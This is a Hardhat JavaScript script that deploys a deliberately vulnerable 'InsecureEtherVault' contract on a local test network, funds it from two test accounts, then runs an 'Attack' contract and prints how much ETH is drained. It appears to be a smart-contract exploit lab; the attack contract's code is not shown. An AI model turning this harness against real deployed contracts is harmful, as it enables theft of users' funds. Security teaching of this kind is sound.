// scripts/exec-attack.js

const { ethers } = require("hardhat");

async function main() {
    const [deployer, user1, user2] = await ethers.getSigners();
    console.log("Deploying with:", deployer.address);

    // Deploy the vulnerable contract
    const Vault = await ethers.getContractFactory("InsecureEtherVault");
    const vault = await Vault.deploy();
    await vault.deployed();
    console.log("InsecureEtherVault deployed at:", vault.address);

    // Users deposit ETH
    await vault.connect(user1).deposit({ value: ethers.utils.parseEther("3") });
    await vault.connect(user2).deposit({ value: ethers.utils.parseEther("2") });

    // Check vault balance
    const totalBefore = await vault.getBalance();
    console.log("Vault balance before attack:", ethers.utils.formatEther(totalBefore), "ETH");

    // Deploy attacker contract
    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(vault.address);
    await attack.deployed();
    console.log("Attack contract deployed at:", attack.address);

    // Start the attack with 1 ETH
    console.log("Launching attack with 1 ETH...");
    await attack.connect(deployer).attack({ value: ethers.utils.parseEther("1") });

    // Final balances
    const finalVaultBal = await vault.getBalance();
    const attackBal = await ethers.provider.getBalance(attack.address);

    console.log("\n✅ Vault balance after attack:", ethers.utils.formatEther(finalVaultBal), "ETH");
    console.log("💰 Attack contract balance:", ethers.utils.formatEther(attackBal), "ETH");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
